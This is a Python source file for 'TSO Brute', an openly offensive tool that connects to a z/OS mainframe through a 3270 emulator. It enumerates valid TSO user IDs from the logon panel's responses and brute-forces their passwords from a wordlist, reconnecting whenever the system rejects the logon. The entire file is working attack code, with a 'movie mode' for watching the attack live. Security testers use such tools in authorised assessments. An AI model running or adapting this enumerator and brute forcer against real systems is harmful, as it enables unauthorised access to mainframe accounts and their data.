#!/usr/bin/python

##################################################################
# TSO User ID Enumerator and Brute Forcer			 #
#                                                                #
# Requirements: Python, s3270 and optionally x3270               #
# Created by: Soldier of Fortran (@mainframed767)                #
# Usage: Given a hostname/ip address and port plus               #
# a user listing this script will enumerate and then             #
# brute force User IDs. It can be put in to enumeration          #
# mode only.                                                     #
#                                                                #
# Copyright GPL 2012                                             #
##################################################################

from py3270 import EmulatorBase
import time #needed for sleep
import sys 
import argparse #needed for argument parsing
import re #needed for regular expression (usnername and password checks)


#################################
##### The location of the x3270 and s3270 programs
##### If you don't want to install x3270 just comment out the line below that starts with x3270_executable (and don't use movie mode)
#################################
class Emulator(EmulatorBase):
	x3270_executable = '3270_Clients/bin/x3270' #uncomment this line if you do not wish to use x3270
	s3270_executable = '3270_Clients/s3270'

def Get_TSO_PANEL():
	#################################
	##### CHANGE THE SECTION BELOW FOR YOUR CUSTOM ENVIRONMENT
	##### THE POINT IS TO GET TO THE TSO LOGIN SCREEN WITH AN INVALID USER ID
	#################################
	
	em.fill_field(21, 22, 'tso', 8) #Sends 'tso' to the screen to launch TSO. The first and second number are where the cursor goes, the 'tso' is the text to send 
	em.send_enter() #presses 'enter' on the keyboard
	time.sleep(results.sleep) #sleeps, because generally mainframes take a while to process these things
	em.wait_for_field() #waits for the keyboard to become unlocked
	em.fill_field(2, 1, 'TSOFAKE', 8) #This is the user ID we pass to TSO the first time you logon. You can change this to whatever you like, but it must be less than 7 characters long and it MUST be an invalid TSO user. 
	em.send_enter() 
	
	#################################
	##### AT THIS POINT WE'RE AT THE LOGON PROMPT
	##### READY TO START BRUTE FORCING / ENUMERATING
	#################################

def Connect_to_ZOS():
	#connects to the target machine and sleeps for 'sleep' seconds
	em.connect(results.target)
	time.sleep(results.sleep)

print '''

       dMMMMMMP .dMMMb  .aMMMb
         dMP   dMP" VP dMP"dMP
        dMP    VMMMb  dMP dMP
       dMP   dP .dMP dMP.aMP
      dMP    VMMMP"  VMMMP"

      dMMMMb  dMMMMb  dMP dMP dMMMMMMP dMMMMMP
     dMP"dMP dMP.dMP dMP dMP    dMP   dMP
    dMMMMK" dMMMMK" dMP dMP    dMP   dMMMP
   dMP.aMF dMP"AMF dMP.aMP    dMP   dMP
  dMMMMP" dMP dMP  VMMMP"    dMP   dMMMMMP


'''

#start argument parser
parser = argparse.ArgumentParser(description='TSO Brute - The z/OS TSO/E logon panel brute forcer.',epilog='Eh TSO Brutus?')
parser.add_argument('-t','--target', help='target IP address or Hostname and port: TARGET[:PORT] default port is 23', required=True,dest='target')
parser.add_argument('-s','--sleep',help='Seconds to sleep between actions (increase on slower systems). The default is 1 second.',default=1,type=int,dest='sleep')
parser.add_argument('-u','--userfile',help='File containing list of usernames', required=True,dest='userfile')
parser.add_argument('-p','--passfile',help='File containing list of passwords',dest='passfile')
parser.add_argument('-m','--moviemode',help='Enables ULTRA AWESOME Movie Mode. Watch the system get hacked in real time!',default=False,dest='movie_mode',action='store_true')
parser.add_argument('-e','--enumerate',help='Enables Enumeration Mode Only. Default is brute force mode',default=False,dest='enumeration',action='store_true')
parser.add_argument('-q','--quiet',help='Only display found users / found passwords',default=False,dest='quiet',action='store_true')
args = parser.parse_args()



print '[+]--------------- TSO Brute - The z/OS TSO/E logon panel enumerator/brute forcer.'
results = parser.parse_args() # put the arg results in the variable results
print '[+]--------------- Target Acquired     =', results.target
print '[+]--------------- Username File       =', results.userfile
userfile=open(results.userfile) #open the usernames file
if not results.enumeration: print '[+]--------------- Password Listing    =', results.passfile
print '[+]--------------- Wait in Seconds     =', results.sleep

if not results.passfile and not results.enumeration: #A pssword file is required if we're not in enumeration mode
	sys.exit("[!]--------------- Not in Enumeration mode (-e). Password file (-p) required! Aborting")

if results.movie_mode:
        if not results.quiet: print '[+]--------------- ULTRA AWESOME Hacker Movie Mode: ENABLED!!'
	em = Emulator(visible=True) #Enables Movie Mode which uses x3270 so it looks all movie like 'n shit
else:
		#or not (uses s3270)
	if not results.quiet: print '[+]--------------- ULTRA AWESOME Hacker Movie Mode: Disabled :('	
	em = Emulator()
if results.quiet: print '[+]--------------- Quiet Mode Enabled: Shhhhhhhhh!'
print '[+]--------------- Connecting to ', results.target
connect = Connect_to_ZOS()
print '[+]--------------- Getting to TSO/E Logon Panel'
connect = Get_TSO_PANEL()
print '                  |- At TSO/E Logon Panel'
time.sleep(results.sleep)

print '                  |- Starting Enumeration'

valid_users = list() #A 1d array to hold the found user IDs. Displays all users IDs at the end. 

for username in userfile:
	if username[0].isdigit():
		if not results.quiet: print '                  |- Username:', username.strip() ,'-- [!] Usernames cannot start with a number, skipping'
	elif not re.match("^[a-zA-Z0-9#@$]+$", username):
		if not results.quiet: print '                  |- Username:', username.strip() ,'-- [!] Username contains an invalid character (Only A-z, 0-9, #, $ and @), skipping'
	elif len(username.strip()) > 7: #TSO only allows a username of 7 characters so don't bother trying it
		if not results.quiet: print '                  |- Username:', username.strip() ,'-- [!] User name too long ( >7 )'
	else:
		em.fill_field(06, 20, username.strip(), 7)
		em.send_enter()
		if em.string_found(02, 12, 'Enter current password for'):
			print '                  |- Username:', username.strip() ,'-- [*] TSO User Found!'
			valid_users.append(username.strip())
			#######
			# Begin Password File Loop if not in Enumeration
			######
			valid_password = False
			if not results.enumeration:
				if not results.quiet: print '                    !! Starting Brute Forcer'
				passfile=open(results.passfile) #open the passwords file
				for password in passfile:
					if not  re.match("^[a-zA-Z0-9#@$]+$", password):
						if not results.quiet: print '                    ->', password.strip(),'-- [!] Password contains an invalid character (Only A-z, 0-9, #, $ and @)'
					elif len(password.strip()) > 8:
						if not results.quiet: print '                    ->', password.strip(),'-- [!] Password too long ( >8 )'
					else:
						em.fill_field(8, 20, password.strip(),8)
						em.send_enter()
						if em.string_found(2, 12, 'PASSWORD NOT AUTHORIZED FOR USERID'):
							if not results.quiet: print '                    ->', password.strip(),'-- [!] Invalid Password'
						elif em.string_found(1, 12, 'LOGON REJECTED'):						
							if not results.quiet: print '                    ->', password.strip(),'-- [!] Invalid Password'
							#Since TSO kicks you out after X invalid attempts, we issue the following commands to reconnect
							reconnect = Get_TSO_PANEL()
							em.fill_field(06, 20, username.strip(), 7)
							em.send_enter()
						#elif 
							#Add code to deal with a locked out account
						else:
							print '                    ->', password.strip(),'-- [*] Password Found!!'
							#once a password is found we have to close the connection and reconnect
							em.terminate()
							if results.movie_mode:
								em = Emulator(visible=True) #Enables Movie Mode which uses x3270 so it looks all movie like 'n shit
							else:
								em = Emulator()
							connect = Connect_to_ZOS()
							valid_password = True
							break
				passfile.close()
			#Since TSO locks the panel, we need to exit and get back
			if not valid_password: 
				em.send_pf3() #send F3 which exits TSO
			reconnect = Get_TSO_PANEL()
		else:
			if not results.quiet: print '                  |- Username:', username.strip(), '-- [!] Not a TSO User' 
		time.sleep(results.sleep)
userfile.close()

if results.enumeration:
	print '[+]--------------- Found', len(valid_users), 'valid user accounts:'
	for enum_user in valid_users:
		print '                  Valid User ID ->', enum_user

# And we're done. Close the connection
em.terminate()
